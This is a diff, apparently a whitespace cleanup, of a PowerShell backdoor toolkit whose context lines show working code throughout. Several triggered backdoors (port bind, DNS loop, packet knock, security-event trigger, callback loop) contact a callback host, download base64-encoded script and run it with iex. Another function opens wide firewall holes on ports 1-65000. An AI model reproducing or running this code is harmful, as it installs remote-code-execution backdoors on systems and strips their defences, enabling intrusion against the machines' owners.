@@ -41,7 +41,7 @@ Whether you want to produce output or not. Default is "FALSE"
 	[Parameter(Mandatory=$False,Position=5)]
 	[bool]$Silent=$false
 	)
-	
+
 	#if you have a place to call home too...
 	if($CallbackIP)
 	{
@@ -72,26 +72,26 @@ Whether you want to produce output or not. Default is "FALSE"
 				write-host "BITS Temp output to: $BitsTempFile"}
 				Import-Module *bits*
 				Start-BitsTransfer $url $BitsTempFile -ErrorAction Stop
-				
+
 				$enc = Get-Content $BitsTempFile -ErrorAction Stop
-				
+
 				#delete the temp file
 				Remove-Item $BitsTempFile -ErrorAction SilentlyContinue
-				
+
 			}
-			else 
+			else
 			{
 				if(-not $Silent) { write-host "Error: Improper callback method" -fore red}
 				return 0
 			}
-			
-			#Check to make sure something got downloaded, if so, decode it and 
+
+			#Check to make sure something got downloaded, if so, decode it and
 			if ($enc)
 			{
 				#decode the string
 				$b = [System.Convert]::FromBase64String($enc)
 				$dec = [System.Text.Encoding]::UTF8.GetString($b)
-				
+
 				#execute script
 				iex $dec
 			}
@@ -120,7 +120,7 @@ Whether you want to produce output or not. Default is "FALSE"
 		if(-not $Silent) { write-host "No host specified for the phone home :(" -fore red}
 		return 0
 	}
-	
+
 	return 1
 }
 
@@ -130,7 +130,7 @@ function Add-PSFirewallRules
 .SYNOPSIS
 Used to open a hole in the firewall to allow Powershell to communicate
 .DESCRIPTION
-Opens 4 rules in the firewall, 2 for each direction. Allows TCP and UDP communications on ports 1-65000. This will hopefully prevent popups from displaying to interactive user. 
+Opens 4 rules in the firewall, 2 for each direction. Allows TCP and UDP communications on ports 1-65000. This will hopefully prevent popups from displaying to interactive user.
 Admin Reqd? No
 Firewall Hole Reqd? No
 .PARAMETER RuleName
@@ -154,7 +154,7 @@ The ports to allow communications on. Default="1-65000"
 		Write-Host "This command requires Admin :(... get to work! "
 		Return
 	}
-	
+
 	#Rule 1, TCP, Outbound
 	$fw = New-Object -ComObject hnetcfg.fwpolicy2
 	$rule = New-Object -ComObject HNetCfg.FWRule
@@ -169,7 +169,7 @@ The ports to allow communications on. Default="1-65000"
 	$rule.Action=1
 	$rule.EdgeTraversal=$false
 	$fw.Rules.Add($rule)
-	
+
 	#Rule 2, UDP Outbound
 	$rule = New-Object -ComObject HNetCfg.FWRule
 	$rule.Name = $RuleName
@@ -183,7 +183,7 @@ The ports to allow communications on. Default="1-65000"
 	$rule.Action=1
 	$rule.EdgeTraversal=$false
 	$fw.Rules.Add($rule)
-	
+
 	#Rule 3, TCP Inbound
 	$rule = New-Object -ComObject HNetCfg.FWRule
 	$rule.Name = $RuleName
@@ -197,7 +197,7 @@ The ports to allow communications on. Default="1-65000"
 	$rule.Action=1
 	$rule.EdgeTraversal=$false
 	$fw.Rules.Add($rule)
-	
+
 	#Rule 4, UDP Inbound
 	$rule = New-Object -ComObject HNetCfg.FWRule
 	$rule.Name = $RuleName
@@ -230,13 +230,13 @@ The unique value to look for in every event packet. In the case of RDP, this wil
 .PARAMETER Timeout
 A value in seconds to continue running the backdoor. Default=0 (run forever)
 .PARAMETER Sleep
-The time to sleep in between event log checks. 
+The time to sleep in between event log checks.
 #>
 	Param(
 	[Parameter(Mandatory=$True,Position=1)]
 	[string]$CallbackIP,
-	[Parameter(Mandatory=$False,Position=2)]	
-	[string]$Trigger="SIXDUB", 
+	[Parameter(Mandatory=$False,Position=2)]
+	[string]$Trigger="SIXDUB",
 	[Parameter(Mandatory=$False,Position=3)]
 	[int]$Timeout=0,
 	[Parameter(Mandatory=$False,Position=4)]
@@ -254,7 +254,7 @@ The time to sleep in between event log checks.
 	write-host "CallbackIP: $CallbackIP"
 	write-host
 	write-host "Starting backdoor..."
-	
+
 	#initiate loop variables
 	$running=$true
 	$match =""
@@ -269,7 +269,7 @@ The time to sleep in between event log checks.
 		#grab all events since the last cycle and store their "message" into a variable
 		$d = Get-Date
 		$NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String
-		
+
 		#check if the events contain our trigger value
 		if ($NewEvents -match $Trigger)
 		{
@@ -291,13 +291,13 @@ function Invoke-PortBind
 .SYNOPSIS
 Starts the TCP Port Bind backdoor
 .DESCRIPTION
-The backdoor opens a TCP port on a specified port. For every connection to the port, it looks for a specified trigger value. When found, it initiates a callback and closes the TCP Port. 
+The backdoor opens a TCP port on a specified port. For every connection to the port, it looks for a specified trigger value. When found, it initiates a callback and closes the TCP Port.
 Admin Reqd? No
 Firewall Hole Reqd? Yes
 .PARAMETER CallbackIP
-The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
+The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it.
 .PARAMETER LocalIP
-The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
+The interface to bind the TCP port to. By default, the script will use the default GW to determine this value.
 .PARAMETER Port
 The port to bind. Default=4444
 .PARAMETER Trigger
@@ -309,25 +309,25 @@ The time to run the backdoor. Default=0 (run forever)
 	[Parameter(Mandatory=$False,Position=1)]
 	[string]$CallbackIP,
 	[Parameter(Mandatory=$False,Position=2)]
-	[string]$LocalIP, 
+	[string]$LocalIP,
 	[Parameter(Mandatory=$False,Position=3)]
-	[int]$Port=4444, 
+	[int]$Port=4444,
 	[Parameter(Mandatory=$False,Position=4)]
-	[string]$Trigger="QAZWSX123", 
+	[string]$Trigger="QAZWSX123",
 	[Parameter(Mandatory=$False,Position=5)]
 	[int]$Timeout=0
 	)
-	
+
 	# try to figure out which IP address to bind to by looking at the default route
-	if (-not $LocalIP) 
+	if (-not $LocalIP)
 	{
-		route print 0* | % { 
-			if ($_ -match "\s{2,}0\.0\.0\.0") { 
+		route print 0* | % {
+			if ($_ -match "\s{2,}0\.0\.0\.0") {
 				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
 				}
 			}
 	}
-	
+
 	#output info
 	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
 	write-host "Timeout: $Timeout"
@@ -338,24 +338,24 @@ The time to run the backdoor. Default=0 (run forever)
 	write-host
 	write-host "Starting backdoor..."
 	try{
-		
+
 		#Define and initialize all the networing stuff
 		$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",$Port)
 		$Listener = new-object System.Net.Sockets.TcpListener $ipendpoint
 		$Listener.Start()
-		
+
 		#set variables for the loop
 		$running=$true
 		$match =""
 		$starttime = get-date
 		while($running)
-		{			
+		{
 			#Check for timeout
 			if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
 			{
 				$running=$false
 			}
-			
+
 			#If there is a connection pending on the socket
 			if($Listener.Pending())
 			{
@@ -364,10 +364,10 @@ The time to run the backdoor. Default=0 (run forever)
 				write-host "Client Connected!"
 				$Stream = $Client.GetStream()
 				$Reader = new-object System.IO.StreamReader $Stream
-				
+
 				#read one line off the socket
 				$line = $Reader.ReadLine()
-				
+
 				#check to see if proper trigger value
 				if ($line -eq $Trigger)
 				{
@@ -375,7 +375,7 @@ The time to run the backdoor. Default=0 (run forever)
 					$match = ([system.net.ipendpoint] $Client.Client.RemoteEndPoint).Address.ToString()
 					write-host "MATCH: $match"
 				}
-				
+
 				#clean up
 				$reader.Dispose()
 				$stream.Dispose()
@@ -383,7 +383,7 @@ The time to run the backdoor. Default=0 (run forever)
 				write-host "Client Disconnected"
 			}
 		}
-		
+
 		#Stop the socket and check for match
 		write-host "Stopping Socket"
 		$Listener.Stop()
@@ -408,7 +408,7 @@ function Invoke-DNSLoop
 {
 <#
 .SYNOPSIS
-Starts the DNS Loop Backdoor 
+Starts the DNS Loop Backdoor
 .DESCRIPTION
 This backdoor resolves a predefined hostname at a preset interval. If the resolved address is different than the specified trigger, than it initiates a callback
 Admin Reqd? No
@@ -436,7 +436,7 @@ The seconds to sleep between DNS resolution. Default="1s"
 		[Parameter(Mandatory=$False,Position=5)]
 		[int] $Sleep=1
 	)
-	
+
 	#output info
 	write-host "Timeout: $Timeout"
 	write-host "Sleep Time: $Sleep"
@@ -445,7 +445,7 @@ The seconds to sleep between DNS resolution. Default="1s"
 	write-host "CallbackIP: $CallbackIP"
 	write-host
 	write-host "Starting backdoor..."
-	
+
 	#set loop variables
 	$running=$true
 	$match =""
@@ -457,7 +457,7 @@ The seconds to sleep between DNS resolution. Default="1s"
 		{
 			$running=$false
 		}
-		
+
 		try {
 			#try to resolve hostname
 			$ips = [System.Net.Dns]::GetHostAddresses($Hostname)
@@ -472,11 +472,11 @@ The seconds to sleep between DNS resolution. Default="1s"
 					$match=$resolved
 					write-host "Match: $match"
 				}
-				
+
 			}
 		}
 		catch [System.Net.Sockets.SocketException]{
-			
+
 		}
 
 		sleep -s $Sleep
@@ -496,18 +496,18 @@ The seconds to sleep between DNS resolution. Default="1s"
 }
 
 function Invoke-PacketKnock
-{	
+{
 <#
 .SYNOPSIS
 Starts the Packet Knock backdoor
 .DESCRIPTION
-The backdoor sniffs packets destined for a certain interface. In each packet, a trigger value is looked for. The the trigger value is found, the backdoor initiates a callback. This backdoor utilizes a promiscuous socket and should not open up a port on the system. 
+The backdoor sniffs packets destined for a certain interface. In each packet, a trigger value is looked for. The the trigger value is found, the backdoor initiates a callback. This backdoor utilizes a promiscuous socket and should not open up a port on the system.
 Admin Reqd? Yes
 Firewall Hole Reqd? Yes
 .PARAMETER CallbackIP
-The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
+The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it.
 .PARAMETER LocalIP
-The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
+The interface to bind the TCP port to. By default, the script will use the default GW to determine this value.
 .PARAMETER Trigger
 The unique value the backdoor is waiting for. Default="QAZWSX123"
 .PARAMETER Timeout
@@ -517,9 +517,9 @@ The time to run the backdoor. Default=0 (run forever)
 	[Parameter(Mandatory=$False,Position=1)]
 	[string]$CallbackIP,
 	[Parameter(Mandatory=$False,Position=2)]
-	[string]$LocalIP, 
+	[string]$LocalIP,
 	[Parameter(Mandatory=$False,Position=3)]
-	[string]$Trigger="QAZWSX123", 
+	[string]$Trigger="QAZWSX123",
 	[Parameter(Mandatory=$False,Position=4)]
 	[int]$Timeout=0
 	)
@@ -529,15 +529,15 @@ The time to run the backdoor. Default=0 (run forever)
 		Return
 	}
 	# try to figure out which IP address to bind to by looking at the default route
-	if (-not $LocalIP) 
+	if (-not $LocalIP)
 	{
-		route print 0* | % { 
-			if ($_ -match "\s{2,}0\.0\.0\.0") { 
+		route print 0* | % {
+			if ($_ -match "\s{2,}0\.0\.0\.0") {
 				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
 				}
 			}
 	}
-	
+
 	#output info
 	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
 	write-host "Timeout: $Timeout"
@@ -546,7 +546,7 @@ The time to run the backdoor. Default=0 (run forever)
 	write-host "CallbackIP: $CallbackIP"
 	write-host
 	write-host "Starting backdoor..."
-	
+
 	#define bytes for socket setup
 	$byteIn = new-object byte[] 4
 	$byteOut = new-object byte[] 4
@@ -555,7 +555,7 @@ The time to run the backdoor. Default=0 (run forever)
 	$byteIn[0] = 1  # this enables promiscuous mode (ReceiveAll)
 	$byteIn[1-3] = 0
 	$byteOut[0-3] = 0
-	
+
 	#Open a raw socket and set to promiscuous mode. Include the IP Header
 	$socket = new-object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
 	$socket.setsocketoption("IP","HeaderIncluded",$true)
@@ -586,32 +586,32 @@ The time to run the backdoor. Default=0 (run forever)
 			start-sleep -milliseconds 500
 			continue
 		}
-		
+
 		#Take any date off the socket
 		$rcv = $socket.receive($byteData,0,$byteData.length,[net.sockets.socketflags]::None)
 
 		# Created streams and readers
 		$MemoryStream = new-object System.IO.MemoryStream($byteData,0,$rcv)
 		$BinaryReader = new-object System.IO.BinaryReader($MemoryStream)
-		
+
 		# Trash all the header bytes we dont care about. RFC 791
 		$trash  = $BinaryReader.ReadBytes(12)
-		
+
 		#Read the SRC and DST IP
 		$SourceIPAddress = $BinaryReader.ReadUInt32()
 		$SourceIPAddress = [System.Net.IPAddress]$SourceIPAddress
 		$DestinationIPAddress = $BinaryReader.ReadUInt32()
 		$DestinationIPAddress = [System.Net.IPAddress]$DestinationIPAddress
 		$RemainderBytes = $BinaryReader.ReadBytes($MemoryStream.Length)
-		
+
 		#Convert the remainder of the packet into ASCII
 		$AsciiEncoding = new-object system.text.asciiencoding
 		$RemainderOfPacket = $AsciiEncoding.GetString($RemainderBytes)
-		
+
 		#clean up clean up
 		$BinaryReader.Close()
 		$memorystream.Close()
-		
+
 		#check rest of packet for trigger value
 		if ($RemainderOfPacket -match $Trigger)
 		{
@@ -620,7 +620,7 @@ The time to run the backdoor. Default=0 (run forever)
 			$match = $SourceIPAddress
 		}
 	}
-	
+
 	if($match)
 	{
 		if($CallbackIP)
@@ -632,7 +632,7 @@ The time to run the backdoor. Default=0 (run forever)
 			$success = Invoke-CallbackIEX $Match
 		}
 	}
-	
+
 }
 
 function Invoke-CallbackLoop
@@ -641,17 +641,17 @@ function Invoke-CallbackLoop
 .SYNOPSIS
 Starts the Callback loop backdoor
 .DESCRIPTION
-The backdoor initiates a callback on a routine interval. If successful in executing a script, the backdoor will exit. 
+The backdoor initiates a callback on a routine interval. If successful in executing a script, the backdoor will exit.
 Admin Reqd? No
 Firewall Hole Reqd? No
 .PARAMETER CallbackIP
-The IP Address of the host to callback to.  
+The IP Address of the host to callback to.
 .PARAMETER Timeout
 The time to run the backdoor. Default=0 (run forever)
 .PARAMETER Sleep
-The seconds to sleep between callback. Default=1. 
+The seconds to sleep between callback. Default=1.
 #>
-	Param(  
+	Param(
 	[Parameter(Mandatory=$True,Position=1)]
 	[string]$CallbackIP,
 	[Parameter(Mandatory=$False,Position=2)]
@@ -659,14 +659,14 @@ The seconds to sleep between callback. Default=1.
 	[Parameter(Mandatory=$False,Position=3)]
 	[int] $Sleep=1
 	)
-	
+
 		#Output info
 	write-host "Timeout: $Timeout"
 	write-host "Sleep: $Sleep"
 	write-host "CallbackIP: $CallbackIP"
 	write-host
 	write-host "Starting backdoor..."
-	
+
 	#initiate loop variables
 	$running=$true
 	$match =""
@@ -678,16 +678,16 @@ The seconds to sleep between callback. Default=1.
 		{
 			$running=$false
 		}
-		
+
 		$CheckSuccess = Invoke-CallbackIEX $CallbackIP -Silent $true
-		
+
 		if($CheckSuccess -eq 1)
 		{
 			$running=$false
 		}
-		
+
 		sleep -s $Sleep
 	}
-	
+
 	write-host "Shutting down backdoor..."
 }
